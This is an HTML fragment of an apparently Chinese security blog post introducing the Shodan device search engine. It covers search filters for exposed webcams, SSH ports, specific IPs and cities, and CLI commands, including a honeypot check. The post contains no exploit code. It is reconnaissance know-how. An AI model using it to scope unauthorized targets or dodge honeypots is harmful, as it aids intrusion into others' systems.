<h2 id="shodan"><a href="#shodan" class="headerlink" title="shodan"></a>shodan</h2><h3 id="shodan介绍"><a href="#shodan介绍" class="headerlink" title="shodan介绍"></a>shodan介绍</h3><p><img src="/images/x18.png" alt=""><br><em>按照官网的介绍shodan是一个物联网的搜索引擎，可以搜索到公网上的一切设备，设备的端口，响应等等，shodan都帮你做了一次的扫描<br>*</em>仅限学习，请勿用于非法用途！**<br><a href="https://account.shodan.io/" target="_blank" rel="noopener">https://account.shodan.io/</a></p>
<h3 id="shodan搜索技巧"><a href="#shodan搜索技巧" class="headerlink" title="shodan搜索技巧"></a>shodan搜索技巧</h3><p>在Explore搜索框中输入webcam进行搜索。<br>通过关键字 port 指定具体端口号。</p>
<pre><code>例如:port:22 指定搜索22号端口的主机信息。</code></pre><p><img src="/images/x19.png" alt=""></p>
<p>通过关键字 host指定具体IP地址。</p>
<pre><code>例如: host:61.135.169.121 指定探测IP地址主机信息。</code></pre><p>利用city:城市名指定搜索具体城市的内容。</p>
<pre><code>例如： city:hangzhou port:22</code></pre><h3 id="3、shodan命令行介绍"><a href="#3、shodan命令行介绍" class="headerlink" title="3、shodan命令行介绍"></a>3、shodan命令行介绍</h3><p>Shodan获取指定IP地址信息：</p>
<pre><code>shodan host ip地址</code></pre><p>Shodan获取账号信息：</p>
<pre><code>利用shodan info 查看自身账户的信息。</code></pre><p>Shodan获取自身外部IP地址：</p>
<pre><code>使用shodan myip</code></pre><p>Shodan检测是否有蜜罐：</p>
<pre><code>利用shodan honeyscore 查看是否有蜜罐保护。</code></pre><hr>
<p><em>写的不全面，望有好的操作望大佬指点指点，谢谢！</em><br><strong>本文属于@ayoung博客，未经许可禁止转载</strong></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
